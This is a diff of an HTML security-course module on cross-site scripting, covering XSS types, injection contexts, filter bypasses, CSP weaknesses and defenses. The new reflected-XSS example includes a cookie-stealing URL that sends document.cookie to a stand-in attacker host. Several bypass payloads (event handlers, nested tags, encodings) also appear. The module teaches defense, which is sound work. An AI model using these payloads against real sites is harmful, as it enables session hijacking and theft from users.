@@ -1,62 +1,162 @@
 <section class="module-header">
-  <h1>Module 09 — Cross-Site Scripting (XSS)</h1>
+  <h1>Module 12 — Cross-Site Scripting (XSS)</h1>
   <p>Master XSS attack vectors across different injection contexts and learn how browsers parse and execute injected code.</p>
 </section>
 
 <section class="theory-section">
-  <h2>Types of XSS</h2>
 
-  <h3>Reflected XSS</h3>
-  <p>The malicious script comes from the current HTTP request. The server includes unvalidated input directly in the response.</p>
-  <pre><code class="language-python"># Server reflects input directly into HTML
+  <h2>The Browser Is the Battleground</h2>
+  <p>
+    If SQL injection is breaking into the bank vault, Cross-Site Scripting (XSS) is tricking the bank teller into handing over money to the wrong person. XSS does not attack the server directly — it attacks <strong>other users</strong> by injecting malicious JavaScript into web pages they visit.
+  </p>
+  <p>
+    Here is why XSS is terrifying: JavaScript running in a user's browser has access to <em>everything</em> that user can see and do on the site. It can read their cookies, capture their keystrokes, modify the page content, make API requests on their behalf, redirect them to phishing pages, and even turn their browser into a proxy for further attacks. And the user has no idea any of this is happening — they just see a normal-looking web page.
+  </p>
+  <p>
+    XSS is the most commonly reported vulnerability in bug bounty programs after IDOR. It appears on virtually every web application that accepts and displays user input — which is virtually every web application, period.
+  </p>
+
+  <h2>The Three Types of XSS</h2>
+
+  <h3>Reflected XSS — The One-Shot Attack</h3>
+  <p>
+    In reflected XSS, the malicious script comes from the current HTTP request. The server takes user input from the URL or form data and includes it directly in the response without sanitization. The attack requires the victim to click a crafted link.
+  </p>
+  <pre><code class="language-python"># Server reflects input directly into HTML — VULNERABLE
 @app.route('/search')
 def search():
     query = request.args.get('q', '')
-    return f"&lt;h1&gt;Results for: {query}&lt;/h1&gt;"</code></pre>
+    return f"&lt;h1&gt;Results for: {query}&lt;/h1&gt;"
 
-  <h3>Stored XSS</h3>
-  <p>The malicious script is permanently stored on the server (database, comment field, profile). Every user who views the page is affected.</p>
+# Attacker crafts a URL like:
+# https://example.com/search?q=&lt;script&gt;document.location='https://evil.com/steal?c='+document.cookie&lt;/script&gt;</code></pre>
+  <p>
+    When the victim clicks this link, the server reflects the script tag back in the HTML, and the victim's browser executes it. The script sends the victim's session cookie to the attacker's server. Game over.
+  </p>
+  <p>
+    "But wait," you might think, "who would click on a URL with <code>&lt;script&gt;</code> in it?" In practice, the URL is encoded (<code>%3Cscript%3E</code>), shortened with a URL shortener, or hidden behind a redirect. Most users never look at URLs before clicking.
+  </p>
 
-  <h3>DOM-based XSS</h3>
-  <p>The vulnerability exists in client-side JavaScript that processes data from an untrusted source (like <code>location.hash</code>) and writes it to the DOM unsafely.</p>
-  <pre><code class="language-javascript">// Vulnerable: innerHTML with untrusted data
-document.getElementById('output').innerHTML = location.hash.slice(1);
+  <h3>Stored XSS — The Persistent Threat</h3>
+  <p>
+    Stored XSS is far more dangerous because the malicious script is permanently saved on the server — in a database, a comment field, a profile page, or anywhere user content is stored. <strong>Every user who views the page is affected</strong>, not just the one who clicked a special link.
+  </p>
+  <p>
+    Think about a forum where users post comments. If an attacker posts a comment containing JavaScript, and the forum displays that comment without sanitization, every person who views that thread gets the malicious script executed in their browser. One injection, thousands of victims.
+  </p>
 
-// Safe: textContent escapes HTML
-document.getElementById('output').textContent = location.hash.slice(1);</code></pre>
+  <div class="callout callout-success">
+    <strong>Real Story — The Samy Worm (2005):</strong> Samy Kamkar created a stored XSS worm on MySpace that added "Samy is my hero" to every infected profile and then spread to that user's friends. In just 20 hours, it infected <strong>over 1 million users</strong>, making it the fastest-spreading virus of all time. MySpace had to take the entire site offline. Samy was sentenced to 3 years probation, community service, and was banned from using computers for a period. The worm was technically "harmless" (it just modified profiles), but it demonstrated the devastating power of stored XSS.
+  </div>
 
-  <h2>Injection Contexts</h2>
-  <p>The context where your input lands determines which payloads will work:</p>
+  <h3>DOM-Based XSS — The Client-Side Trap</h3>
+  <p>
+    In DOM-based XSS, the vulnerability exists entirely in <strong>client-side JavaScript</strong>. The server never sees the malicious input — it is processed by JavaScript running in the browser. This makes DOM XSS harder to detect with server-side security tools.
+  </p>
+  <pre><code class="language-javascript">// VULNERABLE: innerHTML with untrusted data from URL fragment
+var name = location.hash.slice(1);  // e.g., #&lt;img src=x onerror=alert(1)&gt;
+document.getElementById('greeting').innerHTML = 'Welcome, ' + name + '!';
+
+// SAFE: textContent treats everything as text, not HTML
+document.getElementById('greeting').textContent = 'Welcome, ' + name + '!';</code></pre>
+  <p>
+    The key concept is <strong>sources and sinks</strong>. A "source" is where untrusted data enters the JavaScript (e.g., <code>location.hash</code>, <code>location.search</code>, <code>document.referrer</code>, <code>window.name</code>). A "sink" is where that data gets used in a dangerous way (e.g., <code>innerHTML</code>, <code>eval()</code>, <code>document.write()</code>, <code>setTimeout()</code> with a string argument). DOM XSS occurs when tainted data flows from a source to a sink without proper sanitization.
+  </p>
+
+  <h2>Injection Contexts — Where Your Input Lands Matters</h2>
+  <p>
+    The single most important concept in XSS is <strong>context</strong>. The same input might be harmless in one context and devastating in another. Where your input lands in the HTML determines which payloads will work and how you need to "escape" the current context:
+  </p>
 
   <div class="table-wrapper">
     <table>
-      <thead><tr><th>Context</th><th>Example</th><th>Escape Strategy</th></tr></thead>
+      <thead><tr><th>Context</th><th>Example</th><th>Escape Strategy</th><th>Example Payload</th></tr></thead>
       <tbody>
-        <tr><td>HTML body</td><td><code>&lt;p&gt;Hello USER_INPUT&lt;/p&gt;</code></td><td>Inject <code>&lt;script&gt;</code> or event handlers</td></tr>
-        <tr><td>HTML attribute</td><td><code>&lt;input value="USER_INPUT"&gt;</code></td><td>Close attribute with <code>"</code>, add event handler</td></tr>
-        <tr><td>JavaScript string</td><td><code>var x = 'USER_INPUT';</code></td><td>Close string with <code>'</code>, inject code</td></tr>
-        <tr><td>URL/href</td><td><code>&lt;a href="USER_INPUT"&gt;</code></td><td>Use <code>javascript:</code> protocol</td></tr>
+        <tr><td>HTML body</td><td><code>&lt;p&gt;Hello USER_INPUT&lt;/p&gt;</code></td><td>Inject new tags</td><td><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td></tr>
+        <tr><td>HTML attribute</td><td><code>&lt;input value="USER_INPUT"&gt;</code></td><td>Close attribute, add event</td><td><code>" onfocus=alert(1) autofocus="</code></td></tr>
+        <tr><td>JavaScript string</td><td><code>var x = 'USER_INPUT';</code></td><td>Close string, inject code</td><td><code>'; alert(1); var x='</code></td></tr>
+        <tr><td>URL/href</td><td><code>&lt;a href="USER_INPUT"&gt;</code></td><td>Use javascript: protocol</td><td><code>javascript:alert(1)</code></td></tr>
+        <tr><td>CSS value</td><td><code>color: USER_INPUT;</code></td><td>Use expression() (old IE)</td><td><code>red; background:url(javascript:...)</code></td></tr>
+        <tr><td>Inside a comment</td><td><code>&lt;!-- USER_INPUT --&gt;</code></td><td>Close comment, inject tag</td><td><code>--&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;!--</code></td></tr>
       </tbody>
     </table>
   </div>
 
+  <p>
+    This is why a simple "filter out <code>&lt;script&gt;</code> tags" approach never works. In an attribute context, you do not even need script tags — an event handler like <code>onfocus=alert(1)</code> is enough. In a JavaScript string context, you just need to close the string. <strong>Context-aware output encoding is the only reliable defense.</strong>
+  </p>
+
   <h2>Filter Bypass Techniques</h2>
+  <p>
+    Many applications try to prevent XSS with blocklists — filtering out dangerous strings like <code>&lt;script&gt;</code>. This is like playing whack-a-mole. There are hundreds of ways to execute JavaScript in HTML, and blocking them all is practically impossible. Here are just a few:
+  </p>
   <ul>
-    <li><strong>Case variation:</strong> <code>&lt;ScRiPt&gt;</code> — some filters are case-sensitive</li>
-    <li><strong>Alternative tags:</strong> <code>&lt;img&gt;</code>, <code>&lt;svg&gt;</code>, <code>&lt;body&gt;</code>, <code>&lt;details&gt;</code></li>
-    <li><strong>Event handlers:</strong> <code>onerror</code>, <code>onload</code>, <code>onfocus</code>, <code>onmouseover</code></li>
-    <li><strong>SVG:</strong> <code>&lt;svg onload=alert(1)&gt;</code></li>
-    <li><strong>Encoding:</strong> HTML entities, URL encoding, Unicode escapes</li>
+    <li><strong>Case variation:</strong> <code>&lt;ScRiPt&gt;alert(1)&lt;/sCrIpT&gt;</code> — HTML tags are case-insensitive</li>
+    <li><strong>Alternative tags:</strong> <code>&lt;img src=x onerror=alert(1)&gt;</code>, <code>&lt;svg onload=alert(1)&gt;</code>, <code>&lt;body onload=alert(1)&gt;</code>, <code>&lt;details open ontoggle=alert(1)&gt;</code></li>
+    <li><strong>Nested tags:</strong> <code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;</code> — if the filter only removes one instance</li>
+    <li><strong>Event handlers:</strong> <code>onerror</code>, <code>onload</code>, <code>onfocus</code>, <code>onmouseover</code>, <code>onanimationstart</code>, <code>ontoggle</code> — there are over 80 event handlers</li>
+    <li><strong>Encoding tricks:</strong> HTML entities (<code>&amp;lt;</code>), URL encoding (<code>%3C</code>), Unicode escapes (<code>\u003c</code>), hex encoding (<code>&#x3c;</code>)</li>
+    <li><strong>Template literals:</strong> In JavaScript context, <code>alert`1`</code> works without parentheses</li>
+  </ul>
+
+  <div class="callout callout-warning">
+    <strong>The Lesson:</strong> Never try to write your own XSS filter. Use your framework's built-in output encoding (Django's template engine auto-escapes, React's JSX auto-escapes, etc.) and a battle-tested sanitization library like DOMPurify for cases where you need to allow some HTML.
+  </div>
+
+  <h2>What Can an Attacker Do with XSS?</h2>
+  <p>
+    XSS gives the attacker the ability to execute arbitrary JavaScript in the victim's browser, in the context of the vulnerable website. This means:
+  </p>
+  <ul>
+    <li><strong>Session hijacking:</strong> Steal session cookies with <code>document.cookie</code> and impersonate the victim</li>
+    <li><strong>Credential harvesting:</strong> Inject a fake login form that sends credentials to the attacker</li>
+    <li><strong>Keylogging:</strong> Capture everything the user types on the page</li>
+    <li><strong>CSRF token theft:</strong> Read anti-CSRF tokens and use them to perform actions as the victim</li>
+    <li><strong>Phishing:</strong> Modify the page content to trick the user into entering sensitive data</li>
+    <li><strong>Worm propagation:</strong> Automatically spread the XSS to other users (like the Samy worm)</li>
+    <li><strong>Cryptocurrency mining:</strong> Use the victim's CPU to mine crypto</li>
+    <li><strong>Browser exploitation:</strong> Use the XSS as a pivot to exploit browser vulnerabilities (BeEF framework)</li>
   </ul>
 
   <h2>Content Security Policy (CSP)</h2>
-  <p>CSP is a browser mechanism that restricts what scripts can execute:</p>
+  <p>
+    CSP is a browser-side defense mechanism that tells the browser which scripts are allowed to execute. It is set via an HTTP response header:
+  </p>
   <pre><code class="language-http">Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com</code></pre>
-  <p>Common bypasses: <code>unsafe-inline</code>, <code>unsafe-eval</code>, <code>data:</code> URIs, JSONP endpoints on whitelisted domains.</p>
+  <p>
+    This policy says: only execute scripts from the same origin or from <code>cdn.example.com</code>. Inline scripts (like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) are blocked. This is a powerful defense — even if an attacker finds an XSS vulnerability, the browser will refuse to execute the injected script.
+  </p>
+  <p>
+    However, CSP is only as strong as its configuration. Common misconfigurations that weaken or bypass CSP:
+  </p>
+  <ul>
+    <li><code>'unsafe-inline'</code> — defeats the entire purpose of CSP by allowing inline scripts</li>
+    <li><code>'unsafe-eval'</code> — allows <code>eval()</code>, <code>setTimeout('string')</code>, etc.</li>
+    <li><code>data:</code> URIs — allow <code>&lt;script src="data:text/javascript,alert(1)"&gt;</code></li>
+    <li>Overly broad whitelists — if <code>*.google.com</code> is allowed, JSONP endpoints on Google domains can be abused</li>
+    <li>Missing <code>base-uri</code> directive — allows injecting <code>&lt;base&gt;</code> tags to redirect script loads</li>
+  </ul>
+
+  <div class="callout callout-info">
+    <strong>Pro Tip:</strong> To evaluate a CSP policy, paste it into Google's CSP Evaluator tool. It will highlight weaknesses and suggest improvements. A strict CSP with nonce-based script loading is the gold standard.
+  </div>
+
+  <h2>Defense — The Right Way</h2>
+  <p>
+    The defense against XSS is layered:
+  </p>
+  <ol>
+    <li><strong>Context-aware output encoding:</strong> Encode user input based on where it appears in the HTML. HTML-encode for body text, attribute-encode for attribute values, JavaScript-encode for JS strings, URL-encode for URLs. Your template engine probably does this automatically — do not bypass it with <code>|safe</code> or <code>dangerouslySetInnerHTML</code> unless absolutely necessary.</li>
+    <li><strong>Content Security Policy:</strong> Deploy a strict CSP that blocks inline scripts and restricts script sources.</li>
+    <li><strong>HttpOnly cookies:</strong> Set the <code>HttpOnly</code> flag on session cookies so JavaScript cannot read them.</li>
+    <li><strong>Input validation:</strong> Reject input that does not match expected patterns. An email field should not contain <code>&lt;</code> characters.</li>
+    <li><strong>DOMPurify:</strong> When you must render user-supplied HTML (rich text editors, markdown), use DOMPurify to sanitize it.</li>
+  </ol>
 
   <div class="callout callout-danger">
-    <strong>XSS Impact:</strong> Session hijacking (stealing cookies), credential harvesting (fake login forms), CSRF token theft, keylogging, cryptocurrency mining, defacement, and worm propagation.
+    <strong>Remember:</strong> Output encoding is NOT the same as input validation. Validating input catches some attacks, but the definitive defense is encoding the output in the correct context. Even "safe" input like a username could contain <code>&lt;</code> if someone's legal name includes it. Encode on output, always.
   </div>
+
 </section>
 
 <!-- ========== LABS ========== -->
